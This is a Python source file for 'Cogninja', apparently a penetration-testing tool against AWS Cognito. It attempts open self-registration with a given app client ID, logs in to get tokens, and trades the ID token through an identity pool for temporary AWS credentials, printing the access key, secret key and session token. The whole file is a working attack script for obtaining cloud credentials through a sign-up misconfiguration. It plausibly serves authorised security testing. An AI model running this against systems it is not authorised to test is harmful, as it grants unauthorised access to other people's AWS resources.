import boto3
from botocore.exceptions import ClientError
from colorama import Fore, Style, init

init(autoreset=True)

def check_sign_up(user_pool_client_id, username, password, email):
    client = boto3.client('cognito-idp')
    try:
        response = client.sign_up(
            ClientId=user_pool_client_id,
            Username=username,
            Password=password,
            UserAttributes=[{'Name': 'email', 'Value': email}]
        )
        return response
    except ClientError as e:
        error_message = e.response['Error']['Message']
        print(f"{Fore.RED}Error executing sign-up: {error_message}")
        return None

def get_access_token(user_pool_client_id, username, password):
    client = boto3.client('cognito-idp')
    try:
        response = client.initiate_auth(
            AuthFlow='USER_PASSWORD_AUTH',
            AuthParameters={'USERNAME': username, 'PASSWORD': password},
            ClientId=user_pool_client_id
        )
        auth_result = response['AuthenticationResult']
        return auth_result['AccessToken'], auth_result['IdToken']
    except ClientError as e:
        print(f"{Fore.RED}Error obtaining tokens: {e.response['Error']['Message']}")
        return None, None

def get_aws_credentials(user_pool_client_id, identity_id, id_token, region):
    client = boto3.client('cognito-identity', region_name=region)
    try:
        response = client.get_credentials_for_identity(
            IdentityId=identity_id,
            Logins={f'cognito-idp.{region}.amazonaws.com/{user_pool_client_id}': id_token}
        )
        return response['Credentials']
    except ClientError as e:
        print(f"{Fore.RED}Error obtaining AWS credentials: {e.response['Error']['Message']}")
        return None

def main_menu():
    ninja_ascii = '''
                                    ####///.                                   
                                #########////////*                              
                           ##############//////////////                         
                      ###################///////////////                        
                .########################///////////////                        
            ##########################%%%%%/////////////   ######/////          
            ##################%%%%%%%%%%%%%%%%%%%%%%////   ######/////          
            #########%%%%%%%%%%(                           ######/////          
            #####/////*                                    ######/////          
            #####/////*                                    ######/////          
            #####/////*        ,#########////////*         ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*       ###########//////////        ######/////          
            #####/////*             *####////              ######/////          
            #####/////*                                    ######/////          
            #####/////*                                   ,,*####/////          
            #####/////*     .,,,,,              ,,,,,,,,,,*///////////          
            #####/////*  #######,,,,,,,,,,,,,,,,,,////////////////////          
             ####/////*  ###############(////////////////////////////           
                         ################///////////////////////                
                         ################//////////////////                     
                            #############////////////*                          
                                 ########///////.                               
                                      (##//                                     

                
                      ____            _   _ _        _       
                     / ___|___   __ _| \ | (_)_ __  (_) __ _ 
                    | |   / _ \ / _` |  \| | | '_ \ | |/ _` |
                    | |__| (_) | (_| | |\  | | | | || | (_| |
                    \____\___/ \__, |_| \_|_|_| |_|/ |\__,_|
                                |___/             |__/       
    '''

    print(f"{Fore.CYAN}{ninja_ascii}")
    print(f"{Fore.CYAN}Welcome to Cogninja")

    user_pool_client_id = input(f"{Fore.YELLOW}Enter the Cognito User_Pool_Client_Id: {Fore.WHITE}")
    identity_id = input(f"{Fore.YELLOW}Enter the Cognito Identity_Id: {Fore.WHITE}")
    region = input(f"{Fore.YELLOW}Enter the AWS region (e.g., us-east-1): {Fore.WHITE}")

    username = input(f"{Fore.MAGENTA}Enter the username: {Fore.WHITE}")
    password = input(f"{Fore.MAGENTA}Enter the password: {Fore.WHITE}")
    email = input(f"{Fore.MAGENTA}Enter the email: {Fore.WHITE}")
    
    sign_up_response = check_sign_up(user_pool_client_id, username, password, email)
    
    if sign_up_response:
        print(f"{Fore.GREEN}Sign-up successful.")
        access_token, id_token = get_access_token(user_pool_client_id, username, password)
        
        if access_token and id_token:
            print(f"{Fore.MAGENTA}Access_Token: {Fore.GREEN}{access_token}")
            print(f"{Fore.MAGENTA}Id_Token: {Fore.GREEN}{id_token}")

            aws_credentials = get_aws_credentials(user_pool_client_id, identity_id, id_token, region)
            if aws_credentials:
                print(f"{Fore.GREEN}AWS credentials:")
                print(f"  {Fore.CYAN}AccessKeyId: {aws_credentials['AccessKeyId']}")
                print(f"  {Fore.CYAN}SecretKey: {aws_credentials['SecretKey']}")
                print(f"  {Fore.CYAN}SessionToken: {aws_credentials['SessionToken']}")
                print(f"  {Fore.CYAN}Expiration: {aws_credentials['Expiration']}")
            else:
                print(f"{Fore.RED}Unable to obtain AWS credentials.")
        else:
            print(f"{Fore.RED}Unable to obtain access tokens.")
    else:
        print(f"{Fore.RED}The sign-up option is not active. Not vulnerable to Cognito sign-up misconfiguration.")

if __name__ == "__main__":
    main_menu()
